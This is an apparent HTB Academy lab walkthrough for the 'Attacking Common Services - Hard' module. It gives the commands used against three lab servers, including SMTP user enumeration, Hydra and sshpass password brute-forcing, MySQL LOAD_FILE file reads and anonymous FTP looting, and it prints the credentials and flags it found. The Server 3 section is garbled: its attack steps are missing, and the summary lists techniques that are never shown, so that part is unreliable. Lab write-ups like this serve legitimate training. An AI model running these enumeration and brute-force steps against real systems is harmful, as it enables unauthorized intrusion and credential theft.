# HTB Academy - Attacking Common Services (Hard) - Complete Walkthrough

## Overview

This writeup covers the complete exploitation path for three interconnected servers in the **Attacking Common Services - Hard** module on HTB Academy. The goal was to enumerate services, find credentials, gain access, and escalate privileges to read the flag on the Administrator's desktop.

---

## Server 1: `10.129.203.7` (WIN-EASY)

### Nmap Scan

```bash
nmap -p- -T4 10.129.203.7
```

**Open Ports:**
- 21/tcp - FTP (Core FTP Server 2.0)
- 25/tcp - SMTP (hMailServer)
- 80/tcp - HTTP (Apache 2.4.53 / PHP 7.4.29)
- 443/tcp - HTTPS (Self-signed SSL)
- 587/tcp - SMTP (hMailServer)
- 3306/tcp - MySQL (MariaDB <br />
10.4.24)
- 3389/tcp - RDP (Windows Server 2019)

---

### Step 1: SMTP User Enumeration

SMTP was vulnerable to user enumeration using the `RCPT TO` method.

```bash
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -D inlanefreight.htb -t 10.129.203.7
```

**Found user:** `fiona@inlanefreight.htb`

---

### Step 2: Brute-Force SMTP Password

Used Hydra to brute-force the password for Fiona.

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.7
```

**Credentials Found:**
```
fiona@inlanefreight.htb:987654321
```

---

### Step 3: MySQL Access

Connected to MySQL using the discovered credentials. Note the `--skip-ssl` flag due to TLS requirement.

```bash
mysql -h 10.129.203.7 -u fiona -p987654321 --skip-ssl
```

---

### Step 4: Checking File Read Permissions

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

**Result:** Empty value → file read/write allowed.

---

### Step 5: Reading the Flag

```sql
SELECT LOAD_FILE(":/Users/Administrator/Desktop/flag.txt");
```

**Flag:**
```HTB{...}
```

---

## Server 2: `10.129.168.121` (LINUX-MEDIUM)

### Nmap Scan

```bash
nmap -p- -T4 10.129.168.121
```

**Open Ports:**
- 22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)
-53/tcp - DS (ISC BIND 9.16.1)
- 110/tcp - POP3 (Dovecot)
- 995/tcp - POP3S (Dovecot)
- 2121/tcp - FTP (ProFTPD - InlaneFTP)
- 30021/tcp - FTP ProFTPD - Internal FTP **(Anonymous allowed!*)*

---

### Step 1: Anonymous FTP Access

```bash
ftp 10.129.168.121 30021
```

**Login:** `anonymous` 
**Password:** (empty)

---

### Step 2: Enumerating FTP Files

```bash
ls -la
cd simon
ls -la
get mynotes.txt
```

**`mynotes.txt` contents:**
```234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

---

### Step 3:
SSH Brute-Force with Found Passwords

```bash
for user in fiona simon root admin; do
    for pass in $(cat mynotes.txt); do
        sshpass -p "$pass" ssh -o ConnectTimeout=2 $user@10.129.168.121 "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
    done
done
```

**Credentials Found:**
```
simon:8Ns8j1b!23hs4921smHzwn
```

---

### Step 4: SSH Login

```bash
ssh simon@10.129.168.121
```

---

### Step 5: Reading the Flag

```bash
ls
cat flag.txt
```

**Flag:* 
```
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

---

## Server 3: `10.129.203.10` (WIN-HARD)

### Nmap Scan

```bash
nmap -p- -T4 10.129.203.10
```

*Open Ports:**
- 135/tcp - msrpc (Windows RPC)
-445/tcp - SMB (Microsoft-DS)
---- → the final flag:

```bash
HTB{46u$!n9_1!nk3d_$3rv3r$s}
```

---


## Summary of Credentials

| Server | User | Password |
|--------|--------|------------------------|
| 1 (WIN-EASY) | fiona@inlanefreight.htb | 987654321 |
| 2 (LINUX-MEDIUM) | simon | 8Ns8j1b!23hs4921smHzwn |
| 3 (WIN-HARD) | fiona | 48Ns72!bns74@S84NNNSl |

---

## Key Concepts Learned

1. *SMTP User Enumeration* using `RCPT TO`
2. *Brute-forcing* credentials with Hydra
3. *MySQL `LOAD_FILE()` for file read
4. *Anonymous FTP * access and password harvesting
5. *SMB* enumeration and file extraction
Y. *RDP* access with discovered credentials
7. *SQL Server Impersonation* (`EXECUTE AS`)
8. *Linked Servers* for privilege escalation
9. *`OPENROWSET(BULK ...)` for file read without `xp_cmdshell`

---

## Tools Used

- Nmap
- smtp-user-enum
- Hydra
- MySQL CLI
- FTP
- smbclient
- xfreerdp
- sqlcmd
- sshpass

---

## Prevention & Mitigation

- Disable SMTP user enumeration (`VRVY`/`RCPT TO` restrictions)
- Use strong passwords and MFA
- Restrict MySQL `secure_file_priv`
- Disable anonymous FTP access
- Properly configure SMB shares
- Limit SQL Server `IMPERSONATE` permissions
- Audit linked server configurations
- Disable `OPENROWSET`if not needed
- Apply least privilege principle

---

**End of Walkthrough**
